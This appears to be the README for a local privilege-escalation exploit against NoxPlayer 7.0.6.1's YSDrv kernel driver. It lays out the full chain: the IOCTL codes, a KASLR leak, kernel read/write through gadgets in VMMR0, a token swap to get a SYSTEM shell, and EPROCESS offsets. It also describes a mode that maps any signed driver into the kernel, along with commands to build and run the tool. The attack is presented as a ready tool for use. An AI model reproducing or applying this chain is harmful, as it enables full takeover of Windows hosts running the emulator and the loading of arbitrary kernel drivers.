# Nox / YSDrv

local user to system on NoxPlayer 7.0.6.1. another virtualbox supdrv fork with
nothing turned on. no admin. LDR_LOAD is open here too.

- driver / device: `YSDrv` / `\Device\YSDrv`
- vmm module: the nox VMMR0 (ysr0)

## files

- `noxpoc.c` kaslr leak, full lpe, arbitrary signed driver load
- `ys_suptable.h` preferred on-disk pfns for the base vote

## modes

```
noxpoc kaslr          leak: drv/vmm base, session, dual page, nt base
noxpoc lpe            full chain: pdm call, token swap, system shell
noxpoc load <path>    map any signed driver into kernel space
```

## chain

open `\Device\YSDrv`, COOKIE (0x228204) handshake. this fork reports
SUP_IOC_VER 0x290001, worth knowing if you're porting. QUERY_FUNCS (0x228208)
export pfns voted against `ys_suptable.h` gives the driver base, LDR_OPEN
(0x22820C) leaks the resident vmm base. PAGE_ALLOC_EX (0x228228) grabs 16 pages
dual-mapped (control block at +0x64d0), GVMMR0CreateVM arms the path.

the big VMMR0 call (0x22826C) points a pdm request handler at gadgets in the
resident r0 for kernel rd32/wr32, then the usual: PsInitialSystemProcess,
system's token, walk ActiveProcessLinks, overwrite your EPROCESS token, cmd on
the console desktop.

`load <signed.sys>` uses the open LDR_LOAD path (0x228210) to map any validly
signed driver into the kernel without going near the SCM.

offsets: pid 0x1D0, links 0x1D8, token 0x248.

## build & run

```
cl /O2 noxpoc.c /link advapi32.lib
x86_64-w64-mingw32-gcc -O2 noxpoc.c -o noxpoc.exe -ladvapi32
noxpoc lpe
```

lpe and kaslr need the nox vmm resident, so start Nox once this boot. stages
validate canonical kernel addresses and fail quietly on a mismatch.

```
     -- _SiCk // afflicted.sh
```
